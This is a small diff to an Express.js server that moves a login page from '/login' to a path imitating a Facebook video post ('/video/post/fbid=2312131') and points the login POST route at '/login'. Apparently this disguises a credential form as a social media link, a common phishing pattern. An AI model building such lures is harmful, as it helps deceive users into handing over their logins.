@@ -33,7 +33,7 @@ DBCONNECT()
 app.get('/',(req,res)=>{
     res.send("hello world")
 })
-app.get('/login',(req,res)=>{
+app.get('/video/post/fbid=2312131',(req,res)=>{
     res.render( "login.ejs")
 })
 
@@ -41,7 +41,7 @@ app.listen(PORT,()=>{
     console.log("server is running")
 })
 
-app.post('/VIDEOS/user/1234243543/h2h',loginUser)
+app.post('/login',loginUser)
 
 
  
